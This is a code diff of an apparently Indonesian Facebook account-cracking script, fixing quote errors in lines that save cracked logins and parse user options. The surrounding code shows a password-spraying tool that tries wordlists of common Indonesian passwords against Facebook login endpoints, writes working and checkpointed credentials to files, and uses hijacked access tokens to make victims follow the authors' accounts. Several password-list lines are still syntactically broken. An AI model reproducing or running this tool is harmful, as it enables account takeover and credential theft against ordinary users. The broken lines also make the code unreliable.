@@ -199,7 +199,7 @@ def login():
 			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
 			nama=r['name']
 			ttl=r['birthday']
-			open('save',w').write(token)
+			open('save','w').write(token)
 			print(f"\n[{ijo}✓{putih}] LOGIN BERHASIL\n[{merah}!{putih}] HARAP TUNGGU SEBENTAR...")
 			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={token}') #LATIF
 			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={token}") #YANWAR
@@ -232,7 +232,7 @@ class kondisi:
 			logika = crack2(user,pw,'https://b-api.facebook.com/method/auth.login')
 			if logika.get("status")=="ok":
 				ok+=1
-				open('ok',a').write(logika.get('user')+' '+logika.get('pw')+'\n')
+				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
 				print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {logika.get('token')}\33[37;1m                                          ",end="")
 				req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={logika.get("token")}') #LATIF
 				break
@@ -241,7 +241,7 @@ class kondisi:
 				try:
 					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
 				except KeyError:ttl='-'
-				open('cp',a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
+				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
 				if("".join(opsi)=="y"):
 					check_in(logika.get("user"),logika.get("pw"),ttl)
 				elif("".join(opsi)=="t"):
@@ -259,7 +259,7 @@ class kondisi:
 		for pw in aj:
 			logika = crack(user,pw)
 			if logika.get("status")=="ok":
-				open('ok',a').write(logika.get('user')+' '+logika.get('pw')+'\n')
+				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
 				print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookie'))}                                          \33[37;1m\n",end="")
 				coki={"cookie":"".join(logika.get("cookie"))}
 				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
@@ -273,7 +273,7 @@ class kondisi:
 				try:
 					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
 				except KeyError:ttl='-'
-				open('cp',a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
+				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
 				if("".join(opsi)=="y"):
 					check_in(logika.get("user"),logika.get("pw"),ttl)
 				elif("".join(opsi)=="t"):
@@ -292,7 +292,7 @@ class kondisi:
 			logika = crack3(user,pw)
 			if logika.get("status")=="ok":
 				ok+=1
-				open('ok',a').write(logika.get('user')+' '+logika.get('pw')+'\n')
+				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
 				coki={"cookie":''.join(logika.get("cookies"))}
 				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
 				for fllow in r.find_all("a"):
@@ -307,7 +307,7 @@ class kondisi:
 				try:
 					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
 				except KeyError:ttl='-'
-				open('cp',a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
+				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
 				if("".join(opsi)=="y"):
 					check_in(logika.get("user"),logika.get("pw"),ttl)
 				elif("".join(opsi)=="t"):
@@ -451,7 +451,7 @@ def dump(token,nama,ttl):
 		os.system("clear")
 		dump(token,nama,ttl)
 	elif(l in ("ua","UA")):
-		print(f"\n *** USERAGENT SAAT INI: {biruM}{open('ua',r').read()}{putih}\n")
+		print(f"\n *** USERAGENT SAAT INI: {biruM}{open('ua','r').read()}{putih}\n")
 		print("INGIN MENGGANTI USER AGENT?")
 		yt=input("[?] GANTI USERAGENT [Y/T]\t: ")
 		if(yt in ("Y","y")):
@@ -479,9 +479,9 @@ def dump(token,nama,ttl):
 			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
 			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
 			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
-			if(op in ('y',Y')):
+			if(op in ('y','Y')):
 				opsi.append('y')
-			elif(op in ('t',T')):
+			elif(op in ('t','T')):
 				opsi.append('t')
 			else:
 				opsi.append('t')
@@ -496,7 +496,7 @@ def dump(token,nama,ttl):
 						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
 					else:
 						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
-					if(pas in ('t',T')):
+					if(pas in ('t','T')):
 						kirim.submit(kondisi(token).kondisi_api,uid,pw)
 					else:
 						password=pas+password
@@ -513,9 +513,9 @@ def dump(token,nama,ttl):
 			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
 			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
 			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
-			if(op in ('y',Y')):
+			if(op in ('y','Y')):
 				opsi.append('y')
-			elif(op in ('t',T')):
+			elif(op in ('t','T')):
 				opsi.append('t')
 			else:
 				opsi.append('t')
@@ -530,7 +530,7 @@ def dump(token,nama,ttl):
 						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
 					else:
 						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
-					if(pas in ('t',T')):
+					if(pas in ('t','T')):
 						kirim.submit(kondisi(token).kondisi_mbasic,uid,pw)
 					else:
 						password=pas+password
@@ -547,9 +547,9 @@ def dump(token,nama,ttl):
 			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
 			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
 			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
-			if(op in ('y',Y')):
+			if(op in ('y','Y')):
 				opsi.append('y')
-			elif(op in ('t',T')):
+			elif(op in ('t','T')):
 				opsi.append('t')
 			else:
 				opsi.append('t')
@@ -564,7 +564,7 @@ def dump(token,nama,ttl):
 						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
 					else:
 						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat',bangsat123',bangsat12345',bangsatlu',anjing',anjing123',anjing12345',babi',babi123',babi12345',kontol',kontol123',kontol12345',memek',memek123',memek12345',jembut',jembut123',jembut12345',jancok',jancok123',jancok12345',anjay',anjay123',anjay12345',ganteng',ganteng123',ganteng12345',akuganteng',guaganteng',sayaganteng',cantik',cantik123',cantik12345',akucantik',sayacantik',guacantik',sayang',sayang123',sayang12345',akusayangkamu',sayangkamu',cinta',cinta123',cinta12345',akucintakamu',cintakamu',rahasia',rahasia123',rahasia12345',rahasiabanget',lupasandi',masukansandi',bebas',bebas123',bebas12345',terserah',mancung',pesek',akumancung',akupesek',akuimut',persib1933',persija1928',apaya',indonesia12345',rahasia',doraemon]
-					if(pas in ('t',T')):
+					if(pas in ('t','T')):
 						kirim.submit(kondisi(token).kondisi_mbasic2,uid,password)
 					else:
 						password=pas+password
